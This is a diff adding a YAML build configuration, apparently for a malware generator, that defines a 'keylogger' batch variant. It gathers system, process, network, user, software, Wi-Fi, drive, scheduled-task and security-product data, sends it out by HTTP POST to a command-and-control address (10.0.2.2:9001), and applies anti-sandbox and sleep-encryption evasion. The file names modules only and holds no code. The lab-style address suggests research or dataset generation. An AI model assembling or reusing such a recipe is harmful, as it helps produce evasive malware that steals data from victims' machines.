@@ -1,0 +1,23 @@
+name: bat_keylogger_cs_mutated
+description: Full batch recon with all collectors and HTTP exfil
+format: batch
+core:
+- core/output
+collectors:
+- collectors/sysinfo
+- collectors/processes
+- collectors/network
+- collectors/users
+- collectors/software
+- collectors/wifi
+- collectors/drives
+- collectors/scheduled_tasks
+- collectors/security_products
+exfil: exfil/http_post
+arch: arch/sequential
+evasion:
+- evasion/anti_sandbox
+- evasion/sleep_encrypt
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
